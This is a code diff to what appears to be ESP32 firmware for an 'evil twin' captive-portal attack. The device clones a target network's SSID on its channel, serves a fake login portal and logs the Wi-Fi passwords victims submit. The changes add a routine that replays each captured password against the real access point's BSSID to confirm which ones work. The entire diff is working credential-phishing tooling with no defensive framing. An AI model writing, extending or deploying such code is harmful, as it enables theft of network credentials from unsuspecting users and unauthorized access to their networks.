@@ -1,4 +1,5 @@
 #include "evil_portal.h"
+#include "evil_twin_verify.h"
 #include <WiFi.h>
 #include <WebServer.h>
 #include <DNSServer.h>
@@ -21,6 +22,9 @@ static char        s_ssid[33]  = {0};
 static char        s_last[48]  = {0};
 static EvilCred    s_ring[EP_MAX_CREDS];
 static int         s_ring_head = 0;   // index of the next write slot
+static uint8_t     s_target_bssid[6] = {0};   // for password verification
+static uint8_t     s_channel = 0;             // ditto
+static bool        s_verify_enabled = false;
 
 static const byte DNS_PORT = 53;
 
@@ -84,15 +88,26 @@ static void log_cred(const String &pass)
         f.close();
     }
 
-    // Push into the live ring buffer for the on-screen list.
+    // Push into the live ring buffer for the on-screen list. s_creds doubles
+    // as a monotonic capture id — we bump it before assigning so the first
+    // capture is cred_id=1, and evil_verify_status() can look it up by id.
+    s_creds++;
     EvilCred *c = &s_ring[s_ring_head];
+    c->cred_id = s_creds;
     strncpy(c->time, clock, sizeof(c->time) - 1);   c->time[sizeof(c->time) - 1] = '\0';
     strncpy(c->ip, ip.toString().c_str(), sizeof(c->ip) - 1); c->ip[sizeof(c->ip) - 1] = '\0';
     strncpy(c->secret, pass.c_str(), sizeof(c->secret) - 1);  c->secret[sizeof(c->secret) - 1] = '\0';
     s_ring_head = (s_ring_head + 1) % EP_MAX_CREDS;
 
-    s_creds++;
     snprintf(s_last, sizeof(s_last), "%s", pass.c_str());
+
+    // Kick off the verification round-trip if we know which BSSID to test
+    // against. Empty passwords are skipped — no sense round-tripping the AP
+    // for an empty submission (they always fail auth, would clutter results).
+    if (s_verify_enabled && pass.length() > 0) {
+        evil_verify_enqueue(c->cred_id, s_ssid, pass.c_str(),
+                            s_target_bssid, s_channel);
+    }
 }
 
 // ─── handlers ────────────────────────────────────────────────────────────────
@@ -120,7 +135,7 @@ static void handle_not_found()
 }
 
 // ─── lifecycle ───────────────────────────────────────────────────────────────
-bool evil_portal_start(const char *ssid, uint8_t channel)
+bool evil_portal_start(const char *ssid, const uint8_t bssid[6], uint8_t channel)
 {
     if (s_running) evil_portal_stop();
 
@@ -130,6 +145,18 @@ bool evil_portal_start(const char *ssid, uint8_t channel)
     s_last[0] = '\0';
     s_ring_head = 0;
     memset(s_ring, 0, sizeof(s_ring));
+
+    // Remember target BSSID + channel so log_cred() can enqueue a verify
+    // round-trip against the real AP. bssid=NULL / all-zero disables it.
+    s_channel = channel ? channel : 1;
+    s_verify_enabled = false;
+    if (bssid) {
+        memcpy(s_target_bssid, bssid, 6);
+        for (int i = 0; i < 6; i++) if (bssid[i]) { s_verify_enabled = true; break; }
+    } else {
+        memset(s_target_bssid, 0, 6);
+    }
+    evil_verify_reset();
 
     WiFi.mode(WIFI_AP);
     // Open network, same SSID, on the target's channel, hidden=false, 4 clients.
@@ -158,9 +185,13 @@ void evil_portal_stop()
     if (!s_running) return;
     if (s_web) { s_web->stop(); delete s_web; s_web = nullptr; }
     if (s_dns) { s_dns->stop(); delete s_dns; s_dns = nullptr; }
+    // Reset the verify state machine so it doesn't try to poke the radio
+    // after we've torn softAP down.
+    evil_verify_reset();
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_STA);
     s_running = false;
+    s_verify_enabled = false;
 }
 
 bool evil_portal_running() { return s_running; }
@@ -170,6 +201,9 @@ void evil_portal_tick()
     if (!s_running) return;
     if (s_dns) s_dns->processNextRequest();
     if (s_web) s_web->handleClient();
+    // Drive the credential-verification state machine on the main task, so
+    // its WiFi mode transitions don't collide with the WebServer handlers.
+    if (s_verify_enabled) evil_verify_tick();
 }
 
 int         evil_portal_client_count() { return s_running ? WiFi.softAPgetStationNum() : 0; }
